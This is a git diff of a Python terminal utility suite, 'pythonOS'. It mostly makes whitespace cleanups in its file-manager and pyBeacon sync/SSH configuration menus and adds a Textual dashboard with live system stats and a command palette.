         duplicates = optimizer.find_duplicate_files(path, by_content=(search_type == '2'))
-        
+
         if duplicates:
             total_dupes = sum(len(files) - 1 for files in duplicates.values())
             wasted_space = 0
@@ -23549,10 +24785,10 @@ FEATURES:
                     wasted_space += file_size * (len(files) - 1)
                 except:
                     pass
-            
+
             print(f"\n{COLORS['4'][0]}Found {len(duplicates)} duplicate groups ({total_dupes} duplicate files){RESET}")
             print(f"Potential space to recover: {wasted_space / (1024*1024):.2f} MB\n")
-            
+
             for i, (key, files) in enumerate(list(duplicates.items())[:10], 1):
                 print(f"  [{i}] {len(files)} copies:")
                 for f in files[:3]:
@@ -23561,42 +24797,42 @@ FEATURES:
                     print(f"      • ... and {len(files) - 3} more")
         else:
             print(f"{COLORS['2'][0]}No duplicates found.{RESET}")
-        
+
         time.sleep(2)
-    
+
     def _option3_disk_analyzer():
         """Option 3: Disk Space Analyzer"""
         print_header("💾 Disk Space Analyzer")
-        
+
         path = input("Enter path to analyze (default: current dir): ").strip() or os.getcwd()
-        
+
         print(f"\nAnalyzing {path}...\n")
         total_size = optimizer.calculate_directory_size(path)
         usage_by_type = optimizer.calculate_disk_usage_by_type(path)
-        
+
         print(f"Total size: {total_size / (1024*1024):.2f} MB\n")
         print(f"{COLORS['2'][0]}Usage by file type:{RESET}")
-        
+
         for file_type, size in list(usage_by_type.items())[:15]:
             pct = (size / total_size * 100) if total_size > 0 else 0
             bar_len = int(pct / 5)
             bar = "█" * bar_len + "░" * (20 - bar_len)
             print(f"  {file_type:20} [{bar}] {pct:5.1f}% ({size / (1024*1024):8.2f} MB)")
-        
+
         time.sleep(2)
-    
+
     def _option4_text_editor():
         """Option 4: Text Editor Pro"""
         print_header("📝 Text Editor Pro")
         print("Simple text editor with syntax awareness\n")
-        
+
         filepath = input("File to edit (create new or edit existing): ").strip()
         if not filepath:
             print("Cancelled.")
             return
-        
+
         filepath = os.path.expanduser(filepath)
-        
+
         if os.path.exists(filepath):
             with open(filepath, 'r', errors='ignore') as f:
                 content = f.read()
@@ -23604,30 +24840,30 @@ FEATURES:
         else:
             content = ""
             print(f"\nCreating new file: {filepath}")
-        
+
         encoding = optimizer.detect_file_encoding(filepath) if os.path.exists(filepath) else "UTF-8"
         file_type = optimizer.estimate_file_type(filepath)
         print(f"Encoding: {encoding} | Type: {file_type}")
         print("\n[Show in full editor in Textual mode]")
-        
+
         time.sleep(1.5)
-    
+
     def _option5_config_manager():
         """Option 5: Configuration File Manager"""
         print_header("⚙️ Configuration Manager")
         print("Edit JSON, YAML, TOML, INI config files\n")
-        
+
         config_path = input("Config file path: ").strip()
         if not config_path or not os.path.exists(config_path):
             print("File not found.")
             return
-        
+
         try:
             with open(config_path, 'r') as f:
                 content = f.read()
-            
+
             file_ext = os.path.splitext(config_path)[1].lower()
-            
+
             if file_ext == '.json':
                 data = json.loads(content)
                 print(f"\nJSON Config ({len(data)} keys):")
@@ -23641,26 +24877,26 @@ FEATURES:
                         print(f"  {line[:60]}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option6_log_analyzer():
         """Option 6: Log File Analyzer"""
         print_header("📋 Log File Analyzer")
         print("Parse and analyze log files\n")
-        
+
         log_path = input("Log file path: ").strip()
         if not log_path or not os.path.exists(log_path):
             print("File not found.")
             return
-        
+
         try:
             with open(log_path, 'r', errors='ignore') as f:
                 lines = f.readlines()
-            
+
             error_count = sum(1 for l in lines if 'error' in l.lower())
             warning_count = sum(1 for l in lines if 'warn' in l.lower())
-            
+
             print(f"\nLog Statistics:")
             print(f"  Total lines: {len(lines)}")
             print(f"  Errors: {error_count}")
@@ -23670,21 +24906,21 @@ FEATURES:
                 print(f"  {line.rstrip()[:70]}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option7_archive_manager():
         """Option 7: Archive Manager"""
         print_header("📦 Archive Manager")
         print("Create/extract ZIP, TAR, GZIP archives\n")
-        
+
         print("Operations:")
         print("  [1] Create archive from directory")
         print("  [2] Extract archive")
         print("  [3] List archive contents")
-        
+
         op = input("\nSelect: ").strip()
-        
+
         if op == '1':
             import shutil
             src_path = input("Directory to archive: ").strip()
@@ -23695,18 +24931,18 @@ FEATURES:
                     print(f"✅ Created: {archive_name}")
                 except Exception as e:
                     print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option8_batch_renamer():
         """Option 8: Batch File Renamer"""
         print_header("🔄 Batch File Renamer")
         print("Rename multiple files with patterns\n")
-        
+
         path = input("Directory path: ").strip() or os.getcwd()
         pattern = input("Pattern to match (regex): ").strip()
         replacement = input("Replacement pattern: ").strip()
-        
+
         if os.path.isdir(path) and pattern:
             files = [os.path.join(path, f) for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
             renamed = optimizer.batch_rename_files(files, pattern, replacement)
@@ -23715,17 +24951,17 @@ FEATURES:
                 print(f"  {os.path.basename(old)} → {os.path.basename(new)}")
             if len(renamed) > 5:
                 print(f"  ... and {len(renamed) - 5} more")
-        
+
         time.sleep(1.5)
-    
+
     def _option9_file_search():
         """Option 9: Advanced File Search"""
         print_header("🔎 Advanced File Search")
         print("Search by name or content\n")
-        
+
         path = input("Search path (default: current): ").strip() or os.getcwd()
         pattern = input("Search pattern: ").strip()
-        
+
         if pattern:
             results = optimizer.search_files(path, pattern, search_content=False)
             print(f"\n{COLORS['2'][0]}Found {len(results)} matches:{RESET}")
@@ -23733,14 +24969,14 @@ FEATURES:
                 print(f"  • {result}")
             if len(results) > 15:
                 print(f"  ... and {len(results) - 15} more")
-        
+
         time.sleep(1.5)
-    
+
     def _option10_file_permissions():
         """Option 10: File Permissions Manager"""
         print_header("🔐 File Permissions Manager")
         print("View and modify file permissions\n")
-        
+
         filepath = input("File path: ").strip()
         if os.path.exists(filepath):
             stat_info = os.stat(filepath)
@@ -23749,7 +24985,7 @@ FEATURES:
             print(f"Permissions: {oct(mode)[-3:]}")
             print(f"Owner UID: {stat_info.st_uid}")
             print(f"Group GID: {stat_info.st_gid}")
-            
+
             print("\nChange permissions? [chmod format, e.g., 755]: ", end="")
             new_mode = input().strip()
             if new_mode and new_mode.isdigit():
@@ -23758,25 +24994,25 @@ FEATURES:
                     print(f"✅ Permissions changed to {new_mode}")
                 except Exception as e:
                     print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option11_csv_viewer():
         """Option 11: CSV Data Viewer"""
         print_header("📊 CSV Data Viewer")
         print("View and manage CSV files\n")
-        
+
         csv_path = input("CSV file path: ").strip()
         if not csv_path or not os.path.exists(csv_path):
             print("File not found.")
             return
-        
+
         try:
             import csv
             with open(csv_path, 'r') as f:
                 reader = csv.reader(f)
                 rows = list(reader)
-            
+
             print(f"\nCSV Statistics:")
             print(f"  Rows: {len(rows)}")
             print(f"  Columns: {len(rows[0]) if rows else 0}")
@@ -23785,30 +25021,30 @@ FEATURES:
                 print(f"  {i+1}. {row[:5]}")  # Show first 5 columns
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option12_json_inspector():
         """Option 12: JSON File Inspector"""
         print_header("🔍 JSON Inspector")
         print("View and validate JSON files\n")
-        
+
         json_path = input("JSON file path: ").strip()
         if not json_path or not os.path.exists(json_path):
             print("File not found.")
             return
-        
+
         try:
             with open(json_path, 'r') as f:
                 data = json.load(f)
-            
+
             def count_keys(obj, depth=0):
                 if isinstance(obj, dict):
                     return len(obj)
                 elif isinstance(obj, list):
                     return len(obj)
                 return 0
-            
+
             print(f"\nJSON Structure:")
             print(f"  Root type: {type(data).__name__}")
             print(f"  Size: {len(json.dumps(data)):,} bytes")
@@ -23818,52 +25054,52 @@ FEATURES:
             print(f"❌ Invalid JSON: {e}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option13_file_hashing():
         """Option 13: File Hashing Tool"""
         print_header("🔗 File Hashing Tool")
         print("Calculate file hashes (MD5, SHA256)\n")
-        
+
         filepath = input("File path: ").strip()
         if not filepath or not os.path.exists(filepath):
             print("File not found.")
             return
-        
+
         try:
             import hashlib
-            
+
             md5_hash = hashlib.md5()
             sha256_hash = hashlib.sha256()
-            
+
             with open(filepath, 'rb') as f:
                 for chunk in iter(lambda: f.read(4096), b''):
                     md5_hash.update(chunk)
                     sha256_hash.update(chunk)
-            
+
             print(f"\nFile: {filepath}")
             print(f"MD5:    {md5_hash.hexdigest()}")
             print(f"SHA256: {sha256_hash.hexdigest()}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option14_binary_editor():
         """Option 14: Binary File Viewer"""
         print_header("🔢 Binary File Viewer")
         print("View binary files in hex format\n")
-        
+
         filepath = input("Binary file path: ").strip()
         if not filepath or not os.path.exists(filepath):
             print("File not found.")
             return
-        
+
         try:
             with open(filepath, 'rb') as f:
                 data = f.read(256)  # First 256 bytes
-            
+
             print(f"\nHex dump (first 256 bytes):")
             for i in range(0, len(data), 16):
                 hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
@@ -23871,72 +25107,72 @@ FEATURES:
                 print(f"  {i:04x}: {hex_part:<48} {ascii_part}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option15_backup_manager():
         """Option 15: Simple Backup Manager"""
         print_header("💾 Backup Manager")
         print("Create and manage file backups\n")
-        
+
         import shutil
         from datetime import datetime
-        
+
         src_path = input("Source path to backup: ").strip()
         if not src_path or not os.path.exists(src_path):
             print("Path not found.")
             return
-        
+
         backup_dir = os.path.expanduser("~/.pythonOS_data/backups")
         os.makedirs(backup_dir, exist_ok=True)
-        
+
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         backup_name = f"{os.path.basename(src_path.rstrip('/'))}_backup_{timestamp}"
-        
+
         try:
             if os.path.isfile(src_path):
                 shutil.copy2(src_path, os.path.join(backup_dir, backup_name))
             else:
                 shutil.copytree(src_path, os.path.join(backup_dir, backup_name))
-            
+
             print(f"✅ Backup created: {backup_name}")
-            
+
             backups = os.listdir(backup_dir)
             print(f"\nTotal backups: {len(backups)}")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     def _option16_file_sync():
         """Option 16: Directory Synchronizer"""
         print_header("🔄 Directory Synchronizer")
         print("Sync files between two directories\n")
-        
+
         src = input("Source directory: ").strip()
         dst = input("Destination directory: ").strip()
-        
+
         if not os.path.isdir(src) or not os.path.isdir(dst):
             print("Invalid paths.")
             return
-        
+
         try:
             synced = 0
             for filename in os.listdir(src):
                 src_file = os.path.join(src, filename)
                 dst_file = os.path.join(dst, filename)
-                
+
                 if os.path.isfile(src_file):
                     import shutil
                     shutil.copy2(src_file, dst_file)
                     synced += 1
-            
+
             print(f"\n✅ Synced {synced} files")
         except Exception as e:
             print(f"Error: {e}")
-        
+
         time.sleep(1.5)
-    
+
     # Main menu loop
     while True:
         print_header("📁 Enhanced File Manager - 600% AI Enhancement")
@@ -23965,9 +25201,9 @@ FEATURES:
 
  [0] ↩️ Return to Command Center
         """)
-        
+
         choice = input(f"{BOLD}🎯 Select option (0-16): {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -24030,7 +25266,7 @@ def feature_textual_file_manager():
     # AI Optimizer Class - Same as used in feature_enhanced_file_manager
     class TextualFileManagerOptimizer:
         """AI-powered file management algorithms"""
-        
+
         @staticmethod
         def calculate_directory_size(path):
             """Recursively calculate directory size"""
@@ -24046,7 +25282,7 @@ def feature_textual_file_manager():
             except (PermissionError, OSError):
                 pass
             return total_size
-        
+
         @staticmethod
         def find_duplicate_files(path, by_content=False):
             """Find duplicate files by name or content hash"""
@@ -24064,7 +25300,7 @@ def feature_textual_file_manager():
                                 key = md5_hash.hexdigest()
                             else:
                                 key = filename
-                            
+
                             if key not in duplicates:
                                 duplicates[key] = []
                             duplicates[key].append(filepath)
@@ -24073,7 +25309,7 @@ def feature_textual_file_manager():
             except (PermissionError, OSError):
                 pass
             return {k: v for k, v in duplicates.items() if len(v) > 1}
-        
+
         @staticmethod
         def detect_file_encoding(filepath):
             """Detect file encoding"""
@@ -24090,7 +25326,7 @@ def feature_textual_file_manager():
                         return 'UTF-8'
             except:
                 return 'BINARY'
-        
+
         @staticmethod
         def search_files(path, pattern, search_content=False):
             """Search files by name or content"""
@@ -24111,7 +25347,7 @@ def feature_textual_file_manager():
             except (PermissionError, OSError):
                 pass
             return results
-        
+
         @staticmethod
         def estimate_file_type(filepath):
             """Estimate file type from extension"""
@@ -24125,7 +25361,7 @@ def feature_textual_file_manager():
                 '.json': 'JSON', '.xml': 'XML', '.csv': 'CSV'
             }
             return types.get(ext, 'Unknown')
-        
+
         @staticmethod
         def batch_rename_files(files, pattern, replacement):
             """Batch rename files using pattern"""
@@ -24142,7 +25378,7 @@ def feature_textual_file_manager():
                 except (OSError, re.error):
                     pass
             return renamed
-        
+
         @staticmethod
         def calculate_disk_usage_by_type(path):
             """Calculate disk usage grouped by file type"""
@@ -24347,7 +25583,7 @@ def feature_textual_file_manager():
         #main-container {
             height: 1fr;
         }
-        
+
         #toolbar {
             width: 100%;
             height: auto;
@@ -24546,7 +25782,7 @@ def feature_textual_file_manager():
                     30: "🔁 Sync Dry-Run - Size & count preview",
                     31: "📈 Usage Forecast - Simple growth estimate"
                 }
-                
+
                 if choice in tools:
                     self._update_info(f"🛠️  {tools[choice]} | Press 0 to close menu")
                     self._run_tool(choice)
@@ -25243,7 +26479,7 @@ def feature_textual_file_manager():
             """Handle file selection."""
             file_path = str(event.path)
             info_label = self.query_one("#info", Label)
-            
+
             try:
                 if os.path.isfile(file_path):
                     size = os.path.getsize(file_path)
@@ -25325,13 +26561,13 @@ def feature_pybeacon_command_center():
     import base64
     import hashlib
     from pathlib import Path
-    
+
     def _get_beacon_config_path():
         """Get or create beacon configuration path."""
         beacon_dir = Path(os.path.expanduser("~/pythonOS_data/pybeacon"))
         beacon_dir.mkdir(parents=True, exist_ok=True)
         return beacon_dir
-    
+
     def _option1_local_sync():
         """Option 1: Secure Local Sync Only (No Internet)"""
         print_header("🔒 Option 1: Secure Local Sync Only")
@@ -25355,10 +26591,10 @@ SECURITY:
   ✅ Manual control
   ✅ Checksum validation
         """)
-        
+
         beacon_path = _get_beacon_config_path()
         choice = input("\n[1] Create Export Point  [2] Create Import Point  [3] List Sync Points  [0] Back: ").strip()
-        
+
         if choice == '1':
             export_name = input("📝 Export name (e.g., 'machine1_config'): ").strip()
             if export_name:
@@ -25376,7 +26612,7 @@ SECURITY:
                 print(f"📁 Directory: {export_dir}")
                 print("Place your data files here for sync.")
                 time.sleep(2)
-        
+
         elif choice == '2':
             import_name = input("📝 Import name (e.g., 'machine2_data'): ").strip()
             if import_name:
@@ -25393,7 +26629,7 @@ SECURITY:
                 print(f"{COLORS['2'][0]}✅ Import point created: {import_dir}{RESET}")
                 print(f"📁 Copy exported files here.")
                 time.sleep(2)
-        
+
         elif choice == '3':
             sync_dirs = list(beacon_path.glob("export_*")) + list(beacon_path.glob("import_*"))
             if sync_dirs:
@@ -25404,7 +26640,7 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No sync points found.{RESET}")
             time.sleep(1.5)
-    
+
     def _option2_cloud_api():
         """Option 2: Authenticated Cloud API"""
         print_header("☁️ Option 2: Authenticated Cloud API")
@@ -25429,15 +26665,15 @@ SECURITY:
   ✅ Audit logging of all transfers
   ✅ Rate limiting
         """)
-        
+
         beacon_path = _get_beacon_config_path()
         choice = input("\n[1] Configure API  [2] Test Connection  [3] View Config  [0] Back: ").strip()
-        
+
         if choice == '1':
             print("\n🔑 Cloud API Configuration:")
             api_endpoint = input("API Endpoint (e.g., https://api.example.com): ").strip()
             api_token = input("API Token (will be encrypted): ").strip()
-            
+
             if api_endpoint and api_token:
                 config = {
                     "cloud_type": "custom_api",
@@ -25450,7 +26686,7 @@ SECURITY:
                     json.dump(config, f, indent=2)
                 print(f"{COLORS['2'][0]}✅ Cloud API configured securely.{RESET}")
                 time.sleep(1.5)
-        
+
         elif choice == '2':
             config_file = beacon_path / "cloud_api_config.json"
             if config_file.exists():
@@ -25463,7 +26699,7 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No API config found. Configure first.{RESET}")
                 time.sleep(1)
-        
+
         elif choice == '3':
             config_file = beacon_path / "cloud_api_config.json"
             if config_file.exists():
@@ -25477,7 +26713,7 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No API config found.{RESET}")
                 time.sleep(1)
-    
+
     def _option3_scheduled_sync():
         """Option 3: Scheduled Manual Sync"""
         print_header("⏰ Option 3: Scheduled Manual Sync")
@@ -25502,16 +26738,16 @@ SECURITY:
   ✅ Automatic error recovery
   ✅ Data validation before sync
         """)
-        
+
         beacon_path = _get_beacon_config_path()
         choice = input("\n[1] Create Schedule  [2] View Schedules  [3] Sync Now  [0] Back: ").strip()
-        
+
         if choice == '1':
             print("\n📅 Create Sync Schedule:")
             sync_name = input("Schedule name: ").strip()
             sync_time = input("Time (HH:MM format, e.g., 10:30): ").strip()
             sync_direction = input("Direction [1] One-way (Local→Remote)  [2] Two-way: ").strip()
-            
+
             if sync_name and sync_time:
                 schedule = {
                     "name": sync_name,
@@ -25526,7 +26762,7 @@ SECURITY:
                     json.dump(schedule, f, indent=2)
                 print(f"{COLORS['2'][0]}✅ Schedule created: {sync_name}{RESET}")
                 time.sleep(1.5)
-        
+
         elif choice == '2':
             schedules = list(beacon_path.glob("schedule_*.json"))
             if schedules:
@@ -25538,13 +26774,13 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No schedules configured.{RESET}")
             time.sleep(1.5)
-        
+
         elif choice == '3':
             print(f"{COLORS['2'][0]}🔄 Sync initiated (simulated)...{RESET}")
             time.sleep(1)
             print("✅ Sync complete: 3 files transferred, 0 errors")
             time.sleep(1.5)
-    
+
     def _option4_ssh_sftp():
         """Option 4: SSH/SFTP Remote Access (Industry Standard)"""
         print_header("🔐 Option 4: SSH/SFTP Remote Access")
@@ -25570,10 +26806,10 @@ SECURITY:
   ✅ Host key verification
   ✅ Failed attempt alerting
         """)
-        
+
         beacon_path = _get_beacon_config_path()
         choice = input("\n[1] Generate SSH Key  [2] Add Remote Host  [3] List Hosts  [4] Test SSH  [0] Back: ").strip()
-        
+
         if choice == '1':
             key_name = input("SSH key name (default: id_rsa): ").strip() or "id_rsa"
             key_path = beacon_path / f"{key_name}"
@@ -25592,13 +26828,13 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}Key already exists.{RESET}")
                 time.sleep(1)
-        
+
         elif choice == '2':
             print("\n🖥️ Add Remote SSH Host:")
             hostname = input("Hostname/IP: ").strip()
             username = input("Username: ").strip()
             port = input("Port (default: 22): ").strip() or "22"
-            
+
             if hostname and username:
                 host_config = {
                     "hostname": hostname,
@@ -25613,7 +26849,7 @@ SECURITY:
                     json.dump(host_config, f, indent=2)
                 print(f"{COLORS['2'][0]}✅ Host added: {username}@{hostname}:{port}{RESET}")
                 time.sleep(1.5)
-        
+
         elif choice == '3':
             hosts = list(beacon_path.glob("ssh_host_*.json"))
             if hosts:
@@ -25626,7 +26862,7 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No SSH hosts configured.{RESET}")
             time.sleep(1.5)
-        
+
         elif choice == '4':
             hosts = list(beacon_path.glob("ssh_host_*.json"))
             if hosts:
@@ -25641,7 +26877,7 @@ SECURITY:
             else:
                 print(f"{COLORS['4'][0]}No SSH hosts configured.{RESET}")
                 time.sleep(1)
-    
+
     # Main pyBeacon Menu
     while True:
         print_header("🚀 pyBeacon - Secure Inter-Device Communication")
@@ -25668,9 +26904,9 @@ SECURITY:
 
  [0] ↩️ Return to Command Center
         """)
-        
+
         choice = input(f"{BOLD}🎯 Select option (0-4): {RESET}").strip()
-        
+
         if choice == '1':
             _option1_local_sync()
         elif choice == '2':
@@ -25749,6 +26985,516 @@ CLASSIC_APP_ACTIONS = [
     ("server_client", {"title": "Server/Client Switch", "summary": "Encrypted messaging between pythonOS instances.", "category": "network", "operation": "Server_Client_Switch", "func": feature_server_client_switch}),
 ]
 
+# ================================================================================
+# UNIFIED COMMAND DASHBOARD - THIRD INTERFACE
+# ================================================================================
+
+def run_unified_dashboard(return_to_classic=True):
+    """
+    Unified Command Dashboard - Premium 3D Textual Interface
+    Full-featured TUI with real-time monitoring, tabs, scrollable commands, and complete integration.
+    """
+    try:
+        from textual.app import App, ComposeResult
+        from textual.widgets import (
+            Static, Header, Footer, Label, OptionList, TabbedContent, TabPane,
+            ProgressBar, RichLog, Rule, DirectoryTree
+        )
+        from textual.containers import Container, Vertical, Horizontal, ScrollableContainer
+        from textual.reactive import reactive
+        from textual.timer import Timer
+        from rich.text import Text
+        from rich.table import Table
+        from rich.panel import Panel
+        import time
+    except ImportError:
+        print(f"Textual not available. Falling back to Classic Menu.")
+        if return_to_classic:
+            return run_classic_command_center()
+        return
+
+    class RealtimeStatsWidget(Static):
+        """Reactive real-time system statistics widget."""
+
+        cpu_usage = reactive(0.0)
+        ram_usage = reactive(0.0)
+        disk_usage = reactive(0.0)
+        net_sent = reactive(0.0)
+        net_recv = reactive(0.0)
+
+        def render(self) -> Panel:
+            """Render live system statistics."""
+            try:
+                # Update stats
+                self.cpu_usage = psutil.cpu_percent(interval=0.05)
+                self.ram_usage = psutil.virtual_memory().percent
+                self.disk_usage = psutil.disk_usage('/').percent
+                net_io = psutil.net_io_counters()
+                self.net_sent = net_io.bytes_sent / 1024 / 1024
+                self.net_recv = net_io.bytes_recv / 1024 / 1024
+
+                # Create progress bars
+                cpu_bar = int(self.cpu_usage / 5)
+                ram_bar = int(self.ram_usage / 5)
+                disk_bar = int(self.disk_usage / 5)
+
+                cpu_visual = "█" * cpu_bar + "░" * (20 - cpu_bar)
+                ram_visual = "█" * ram_bar + "░" * (20 - ram_bar)
+                disk_visual = "█" * disk_bar + "░" * (20 - disk_bar)
+
+                # Build stats text
+                stats_text = (
+                    f"⚡ [bold cyan]CPU[/bold cyan]   {cpu_visual} {self.cpu_usage:5.1f}%\n"
+                    f"🧠 [bold green]RAM[/bold green]   {ram_visual} {self.ram_usage:5.1f}%\n"
+                    f"💾 [bold yellow]DISK[/bold yellow]  {disk_visual} {self.disk_usage:5.1f}%\n"
+                    f"📊 [bold magenta]NETWORK[/bold magenta] ⬆ {self.net_sent:7.1f}MB  ⬇ {self.net_recv:7.1f}MB"
+                )
+
+                return Panel(
+                    Text.from_markup(stats_text),
+                    title="[bold]🖥️  SYSTEM MONITORING[/bold]",
+                    border_style="cyan",
+                    expand=False
+                )
+            except Exception as e:
+                return Panel(f"Error: {e}", title="System Stats", border_style="red")
+
+        def on_mount(self) -> None:
+            """Start updating stats periodically."""
+            self.set_interval(0.5, self._update_stats)
+
+        def _update_stats(self) -> None:
+            """Trigger a render update."""
+            self.refresh()
+
+    class CommandPaletteWidget(Static):
+        """Organized command palette with categories."""
+
+        def render(self) -> Panel:
+            """Render categorized commands."""
+            commands = """
+[bold cyan]═══════════════════════════════════════════════════════════════[/bold cyan]
+[bold yellow]🖥️  SYSTEM & CORE[/bold yellow]         [bold yellow]🔧 TOOLS & UTILITIES[/bold yellow]
+[bold cyan]───────────────────────────  ─────────────────────────────[/bold cyan]
+[1] Browser          [6] Colors       [N] Logs      [S] Calculator
+[2] Disk I/O         [7] Web          [O] Download  [T] Text Editor
+[3] Process          [8] Disk Mgr     [+] Logger    [X] TUI Tools
+[4] Plugin           [9] Search       [14] Server   [Y] RAM Drive
+[5] Dashboard        [10] Plugin      [11] Remote   [U] Enhanced
+
+[bold magenta]🔐 SECURITY & AUDIT[/bold magenta]      [bold magenta]🌐 NETWORK & CONNECTIVITY[/bold magenta]
+[bold cyan]───────────────────────────  ─────────────────────────────[/bold cyan]
+[A] Security Audit   [F] Latency      [M] Traffic   [W] pyBeacon
+[B] Environment      [J] WiFi         [L] Bluetooth [0] Net Tools
+[C] Hardware Serial  [*] Sec Audit    [V] Exit
+[D] AI Probe
+[12] Penetration     [13] Defence
+
+[bold green]🎨 MEDIA & DISPLAY[/bold green]       [bold green]🚀 ADVANCED & MONITORING[/bold green]
+[bold cyan]───────────────────────────  ─────────────────────────────[/bold cyan]
+[I] Media Center     [G] Weather      [~] Health
+[H] Display FX       [K] AI Center    [Z] Performance
+                     [E] Calendar     [R] Satellite
+                     [P] PWN Tools    [Q] Python Power
+                     [↑] History      [→] Shortcuts
+
+[bold yellow]CONTROLS:[/bold yellow] Press key to execute | Q=Quit | ?=Help | ARROWS=Navigate
+"""
+            return Panel(
+                Text.from_markup(commands),
+                title="[bold]⌨️  COMMAND PALETTE[/bold]",
+                border_style="yellow",
+                expand=True
+            )
+
+    class SystemLogsWidget(Static):
+        """Display system logs and events."""
+
+        selected_cmd = reactive("", recompose=True)
+
+        def render(self) -> Panel:
+            """Render system information and events."""
+            # Get system info
+            uptime = time.time() - psutil.boot_time()
+            uptime_str = f"{int(uptime // 86400)}d {int((uptime % 86400) // 3600)}h {int((uptime % 3600) // 60)}m"
+
+            sys_info = f"""[bold cyan]System Information[/bold cyan]
+───────────────────────────────────────
+Platform: {psutil.os.name}
+Python: {psutil.sys.version.split()[0]}
+Uptime: {uptime_str}
+CPU Cores: {psutil.cpu_count(logical=False)} (physical) / {psutil.cpu_count()} (logical)
+Process Count: {len(psutil.pids())}
+
+[bold green]Recent Events[/bold green]
+───────────────────────────────────────
+✓ Dashboard initialized
+✓ System monitoring active
+✓ All systems operational
+"""
+
+            # Add selected command display if one is pending
+            if self.selected_cmd:
+                sys_info += f"\n[bold yellow]>> Selected: {self.selected_cmd}[/bold yellow]\n[cyan]Press Enter to execute or any key to cancel[/cyan]"
+
+            return Panel(
+                Text.from_markup(sys_info),
+                title="[bold]📋 SYSTEM INFO[/bold]",
+                border_style="green",
+                expand=False
+            )
+
+    # Command execution map - reusable throughout the dashboard
+    COMMAND_MAP = {
+        "1": ("Web_Browser", feature_web_browser_center),
+        "2": ("Disk_IO_Report", feature_disk_io_report),
+        "3": ("Process_Monitor", feature_process_search),
+        "4": ("Plugin_Center", feature_plugin_center),
+        "5": ("Remote_Dashboard", feature_remote_dashboard),
+        "6": (None, None),
+        "7": ("Web_Browser", feature_web_browser_center),
+        "8": ("Disk_Analysis", feature_disk_io_report),
+        "9": ("Process_Search", feature_process_search),
+        "0": ("Network_Toolkit", feature_network_toolkit),
+        "10": ("Plugin_Center", feature_plugin_center),
+        "11": ("Remote_Dashboard", feature_remote_dashboard),
+        "12": ("Pen_Test_Toolkit", feature_pentest_toolkit),
+        "13": ("Defence_Center", feature_defence_center),
+        "14": ("Server_Client_Switch", feature_server_client_switch),
+        "a": ("Security_Audit", feature_security_audit),
+        "b": ("Environment_Probe", feature_environment_probe),
+        "c": ("Hardware_Serials", feature_hardware_serials),
+        "d": ("AI_Probe", feature_deep_probe_ai),
+        "e": ("Calendar", feature_enhanced_calendar),
+        "f": ("Latency_Probe", feature_latency_probe),
+        "g": ("Weather_Display", feature_weather_display),
+        "h": ("Display_FX", feature_test_font_size),
+        "i": ("Media_Menu", feature_media_menu),
+        "j": ("WiFi_Toolkit", feature_wifi_toolkit),
+        "k": ("AI_Center", feature_ai_center),
+        "l": ("Bluetooth_Toolkit", feature_bluetooth_toolkit),
+        "m": ("Traffic_Report", feature_traffic_report),
+        "n": ("Database_Log_Center", feature_database_log_center),
+        "o": ("Download_Center", feature_download_center),
+        "p": ("PWN_Tools", feature_pwn_tools),
+        "q": ("Python_Power", feature_python_power),
+        "r": ("Satellite_Tracker", feature_satellite_tracker),
+        "s": ("Graphing_Calculator", feature_graphing_calculator),
+        "t": ("Text_Doc_Center", feature_text_doc_center),
+        "x": ("TUI_Tools", feature_tui_tools),
+        "y": ("Ram_Drive", feature_ram_drive),
+        "z": ("Perf_Stats", display_performance_stats),
+        "w": ("pyBeacon_Command_Center", feature_pybeacon_command_center),
+        "~": ("System_Health", display_system_health),
+        "+": ("Logging_System", display_logging_menu),
+        "*": ("Security_Audit_Menu", display_security_audit_menu),
+    }
+
+    class UnifiedDashboard(App):
+        """Premium Unified Command Dashboard."""
+
+        TITLE = "🎯 pythonOS Unified Dashboard 3D"
+        SUB_TITLE = "All features • Real-time monitoring • Full Textual rendering"
+
+        BINDINGS = [
+            ("q", "quit_app", "Quit"),
+            ("?", "show_help", "Help"),
+            ("r", "refresh", "Refresh"),
+        ]
+
+        # Command buffer for multi-digit commands
+        command_buffer = ""
+        command_timer = None
+        selected_command = ""  # Track the selected command waiting for Enter
+
+        # Valid multi-digit commands
+        MULTI_DIGIT_COMMANDS = {"10", "11", "12", "13", "14"}
+
+        CSS = """
+        Screen {
+            background: $surface;
+            color: $text;
+        }
+
+        Header {
+            dock: top;
+            height: 3;
+            background: $boost;
+            border-bottom: heavy $accent;
+        }
+
+        Footer {
+            dock: bottom;
+            height: auto;
+            background: $boost;
+            border-top: heavy $accent;
+        }
+
+        #main-container {
+            height: 1fr;
+            layout: vertical;
+        }
+
+        #stats-panel {
+            height: auto;
+            border: solid $accent;
+            margin: 0 1;
+        }
+
+        #tabs-container {
+            height: 1fr;
+            border: solid $accent;
+            margin: 1 1;
+        }
+
+        #commands-view {
+            height: 1fr;
+            overflow-y: auto;
+            overflow-x: hidden;
+            border: none;
+            margin: 0;
+        }
+
+        #logs-view {
+            height: 1fr;
+            overflow-y: auto;
+            border: none;
+            margin: 0;
+        }
+
+        TabPane {
+            border: none;
+            padding: 0 1;
+        }
+
+        TabbedContent {
+            border: solid $accent;
+        }
+
+        Rule {
+            color: $accent;
+        }
+        """
+
+        def compose(self) -> ComposeResult:
+            """Build the dashboard layout."""
+            yield Header()
+
